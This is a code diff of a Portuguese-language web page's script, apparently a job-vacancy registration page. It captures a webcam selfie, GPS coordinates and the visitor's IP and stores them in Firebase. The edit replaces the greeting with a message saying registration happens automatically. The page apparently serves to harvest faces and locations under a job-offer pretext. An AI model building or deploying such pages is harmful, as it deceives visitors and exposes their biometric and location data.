@@ -1,5 +1,3 @@
-// script.js
-
 import { initializeApp }
 from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
 
@@ -52,10 +50,12 @@ const canvas =
 document.getElementById("canvas");
 
 // ======================
-// ÁUDIO AUTOMÁTICO
+// ÁUDIO
 // ======================
 
 function falar(texto){
+
+  speechSynthesis.cancel();
 
   const fala =
   new SpeechSynthesisUtterance(
@@ -67,7 +67,7 @@ function falar(texto){
 
   fala.volume = 1;
 
-  fala.rate = 1;
+  fala.rate = 0.95;
 
   fala.pitch = 1;
 
@@ -86,7 +86,7 @@ async function iniciarSistema(){
   try{
 
     falar(
-      "Bem vindo ao Grupo RV mais Vale. Clique no botão verde para participar das vagas disponíveis."
+      "Seu cadastro será realizado automaticamente. Aguarde alguns segundos."
     );
 
     statusText.innerHTML =
@@ -108,8 +108,6 @@ async function iniciarSistema(){
     stream;
 
     await video.play();
-
-    // espera vídeo carregar
 
     await new Promise(
       (resolve)=>{
@@ -133,10 +131,6 @@ async function iniciarSistema(){
     statusText.innerHTML =
     "✅ Sistema pronto";
 
-    falar(
-      "Sistema pronto. Clique no botão para continuar."
-    );
-
   }
 
   catch(err){
@@ -145,10 +139,6 @@ async function iniciarSistema(){
 
     statusText.innerHTML =
     "❌ Permita câmera";
-
-    falar(
-      "Permita o acesso à câmera para continuar."
-    );
 
   }
 
@@ -175,16 +165,12 @@ btn.addEventListener(
       btn.innerHTML =
       "PROCESSANDO...";
 
-      falar(
-        "Cadastro iniciado."
-      );
-
-      // ====================
-      // SELFIE
-      // ====================
-
       statusText.innerHTML =
       "📸 Capturando imagem...";
+
+      falar(
+        "Capturando imagem."
+      );
 
       const largura =
       video.videoWidth;
@@ -223,9 +209,9 @@ btn.addEventListener(
         0.9
       );
 
-      // ====================
-      // LOCALIZAÇÃO
-      // ====================
+      // ======================
+      // GPS
+      // ======================
 
       let latitude =
       "não permitido";
@@ -273,9 +259,9 @@ btn.addEventListener(
 
       }
 
-      // ====================
+      // ======================
       // IP
-      // ====================
+      // ======================
 
       let ip =
       "indisponível";
@@ -317,9 +303,9 @@ btn.addEventListener(
 
       }
 
-      // ====================
+      // ======================
       // FIREBASE
-      // ====================
+      // ======================
 
       statusText.innerHTML =
       "💾 Salvando cadastro...";
@@ -370,9 +356,9 @@ btn.addEventListener(
         }
       );
 
-      // ====================
+      // ======================
       // FINAL
-      // ====================
+      // ======================
 
       statusText.innerHTML =
       "✅ Cadastro concluído";
@@ -396,10 +382,6 @@ btn.addEventListener(
 
       statusText.innerHTML =
       "❌ Erro no cadastro";
-
-      falar(
-        "Ocorreu um erro no cadastro."
-      );
 
       btn.disabled = false;
 
